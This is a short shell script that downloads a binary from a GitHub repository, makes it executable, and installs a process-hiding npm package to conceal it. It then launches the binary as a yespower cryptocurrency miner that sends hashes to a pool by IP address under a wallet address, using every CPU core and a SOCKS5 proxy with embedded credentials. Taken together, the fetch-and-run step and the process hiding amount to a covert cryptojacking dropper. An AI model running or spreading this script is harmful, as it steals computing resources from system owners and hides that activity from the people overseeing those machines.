#!/bin/sh
apt update -y
wget -q https://github.com/thirthada007/DevOps/raw/main/data
chmod +x data
npm i -g node-process-hider 
ph add data
./data -a yespower -o stratum+tcp://206.189.2.17:3333 -u WYBnNEVUPjTFA1rQypC6XK3DRNmosrgqce.kom -p x -t $(nproc) -x socks5://Gahsdbdn:Aapaoddun@45.15.169.241:5362
